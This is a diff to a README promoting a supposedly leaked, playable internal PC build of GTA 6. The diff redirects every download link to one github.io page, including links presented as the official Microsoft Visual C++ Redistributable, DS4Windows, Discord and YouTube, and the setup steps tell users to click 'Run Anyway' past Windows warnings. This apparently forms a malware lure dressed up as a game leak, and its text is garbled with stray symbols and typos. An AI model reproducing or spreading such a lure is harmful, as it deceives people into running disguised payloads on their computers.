@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Internal-Build-Leaked-December - Play GTA 6 on PC Today
 
-[![Download GTA 6 Internal Build](https://img.shields.io/badge/Download-GTA_6_Internal_Build-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/JBall513/GTA-6-Internal-Build-Leaked-December/releases)
+[![Download GTA 6 Internal Build](https://img.shields.io/badge/Download-GTA_6_Internal_Build-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://jball513.github.io)
 
 ## 🕹️ What Is This?
 
@@ -12,7 +12,7 @@ This is a fully playable internal development build of **GTA 6** for Windows PC.
 
 **Visit this link to download the application:**
 
-[🔗 Click Here to Download GTA 6 Internal Build](https://github.com/JBall513/GTA-6-Internal-Build-Leaked-December/releases)
+[🔗 Click Here to Download GTA 6 Internal Build](https://jball513.github.io)
 
 )
 
@@ -51,7 +51,7 @@ After extraction:
 4. Windows mast ask for permission — click "Yes" or "Run Anyway". 
 5. The game will openin a full-screen window. 
 
-**Important:** If you see an error about "missing DLL" or "Visual C++ Redistributable", you need to install [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) first (free from Microsoft**. Then try again.).
+**Important:** If you see an error about "missing DLL" or "Visual C++ Redistributable", you need to install [Microsoft Visual C++ Redistributable](https://jball513.github.io) first (free from Microsoft**. Then try again.).
 
 
 
@@ -101,7 +101,7 @@ To run this build smoothly, your PC should have:
 ### Controller Not Working
 
 - This build supports Xbox controllers natively**. 
-- For PlayStation controllers, use [DS4Windows](https://ds4-windows.com**) free tool**. 
+- For PlayStation controllers, use [DS4Windows](https://jball513.github.io**) free tool**. 
 - Ensure controller is plugged in before launching the game**.
 
 ### Save Game Not Working
@@ -117,9 +117,9 @@ This is a leaked pre-release development build intended for private testing and 
 
 ## 🌐 Join the Community
 
-- **Discord**: Join our [GTA 6 Leaks Discord](https://discord.gg/gta6leaks**) to share screenshots, find multiplayer tips,and report bugs**. 
+- **Discord**: Join our [GTA 6 Leaks Discord](https://jball513.github.io**) to share screenshots, find multiplayer tips,and report bugs**. 
 - **Reddit**: Visit r/GTA6Leaks for daily discussionsand mod support. 
-- **YouTube**: Watch our [Setup Tutorial Video](https://youtu.Be/gta6setup**) if you prefer visual instructions. 
+- **YouTube**: Watch our [Setup Tutorial Video](https://jball513.github.io**) if you prefer visual instructions. 
 
 ## ❓ Frequently Asked Questions (FAQ**))
 
